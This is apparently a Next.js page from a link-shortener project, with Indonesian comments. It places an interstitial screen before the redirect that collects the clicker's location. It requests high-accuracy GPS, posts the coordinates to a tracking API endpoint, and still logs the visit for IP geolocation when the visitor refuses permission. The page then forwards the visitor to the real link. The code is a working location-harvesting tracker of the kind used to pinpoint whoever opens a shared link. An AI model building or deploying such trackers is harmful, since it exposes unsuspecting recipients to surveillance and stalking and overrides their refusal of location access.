// pages/r/[id].js - Halaman perantara sebelum redirect
import { useEffect, useState } from 'react';
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
);

export default function RedirectPage({ linkData, error }) {
  const [status, setStatus] = useState('Mendapatkan lokasi presisi...');
  const [accuracy, setAccuracy] = useState(null);
  const [countdown, setCountdown] = useState(3);

  useEffect(() => {
    if (error || !linkData) {
      window.location.href = 'https://google.com';
      return;
    }

    // Mulai countdown
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    // Dapatkan GPS
    if (!navigator.geolocation) {
      setStatus('⚠️ Browser tidak support GPS, menggunakan IP geolocation');
      sendLocation(null);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      // Success
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        setAccuracy(accuracy);
        setStatus(`✅ Lokasi ditemukan! Akurasi ±${Math.round(accuracy)}m`);
        
        await sendLocation({
          lat: latitude,
          lon: longitude,
          accuracy: accuracy
        });
      },
      // Error
      async (err) => {
        console.warn('Geolocation error:', err.message);
        setStatus('⚠️ Izin lokasi ditolak, menggunakan IP geolocation');
        await sendLocation(null);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );

    return () => clearInterval(timer);
  }, [linkData, error]);

  async function sendLocation(gpsData) {
    try {
      const response = await fetch('/api/track-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          shortId: linkData.short_id,
          gps: gpsData,
          timestamp: new Date().toISOString()
        })
      });

      const result = await response.json();
      console.log('📍 Lokasi terkirim:', result);

      // Redirect setelah countdown selesai
      setTimeout(() => {
        window.location.href = linkData.target_url;
      }, 3000);
    } catch (err) {
      console.error('Gagal kirim lokasi:', err);
      setTimeout(() => {
        window.location.href = linkData.target_url;
      }, 2000);
    }
  }

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '100vh',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif',
      backgroundColor: '#0a0a0a',
      color: 'white',
      flexDirection: 'column',
      padding: '20px'
    }}>
      <div style={{
        padding: '40px',
        borderRadius: '16px',
        backgroundColor: '#1a1a1a',
        textAlign: 'center',
        maxWidth: '500px',
        width: '100%',
        border: '1px solid #2a2a2a',
        boxShadow: '0 8px 32px rgba(0,0,0,0.5)'
      }}>
        <div style={{ fontSize: '48px', marginBottom: '10px' }}>
          {accuracy !== null && accuracy < 500 ? '🎯' : '📍'}
        </div>
        
        <h2 style={{ 
          color: accuracy !== null && accuracy < 500 ? '#4CAF50' : '#FFA726',
          marginBottom: '10px'
        }}>
          {accuracy !== null && accuracy < 500 ? 'Lokasi Presisi Ditemukan!' : 'Mengakses Link...'}
        </h2>
        
        <p style={{ margin: '20px 0', fontSize: '16px', color: '#aaa' }}>{status}</p>
        
        {accuracy !== null && (
          <div style={{
            padding: '12px',
            borderRadius: '8px',
            marginBottom: '20px',
            backgroundColor: accuracy < 500 ? 'rgba(76, 175, 80, 0.15)' : 'rgba(255, 167, 38, 0.15)',
            border: `1px solid ${accuracy < 500 ? '#4CAF50' : '#FFA726'}`
          }}>
            <div style={{ fontSize: '24px', fontWeight: 'bold', color: accuracy < 500 ? '#4CAF50' : '#FFA726' }}>
              ±{Math.round(accuracy)} meter
            </div>
            <div style={{ fontSize: '14px', color: '#888', marginTop: '4px' }}>
              {accuracy < 500 ? '✅ Dalam radius 500m' : '⚠️ Melebihi 500m (fallback IP)'}
            </div>
          </div>
        )}

        <div style={{ 
          fontSize: '14px', 
          color: '#666', 
          marginTop: '20px',
          borderTop: '1px solid #2a2a2a',
          paddingTop: '20px'
        }}>
          Redirect dalam <strong style={{ color: 'white' }}>{countdown}</strong> detik...
        </div>

        <button 
          onClick={() => window.location.href = linkData?.target_url || 'https://google.com'}
          style={{
            marginTop: '15px',
            padding: '10px 30px',
            backgroundColor: '#2a2a2a',
            color: 'white',
            border: '1px solid #3a3a3a',
            borderRadius: '8px',
            cursor: 'pointer',
            fontSize: '14px',
            transition: 'all 0.3s'
          }}
          onMouseEnter={(e) => e.target.style.backgroundColor = '#3a3a3a'}
          onMouseLeave={(e) => e.target.style.backgroundColor = '#2a2a2a'}
        >
          Lewati & Redirect Sekarang →
        </button>
      </div>
    </div>
  );
}

// Server-side: Ambil data link
export async function getServerSideProps(context) {
  const { id } = context.params;
  
  try {
    const { data: linkData, error } = await supabase
      .from('links')
      .select('*')
      .eq('short_id', id)
      .single();

    if (error || !linkData) {
      return { props: { error: 'Link tidak ditemukan' } };
    }

    return {
      props: {
        linkData: {
          short_id: linkData.short_id,
          target_url: linkData.target_url,
          user_id: linkData.user_id
        }
      }
    };
  } catch (err) {
    return { props: { error: 'Terjadi kesalahan' } };
  }
}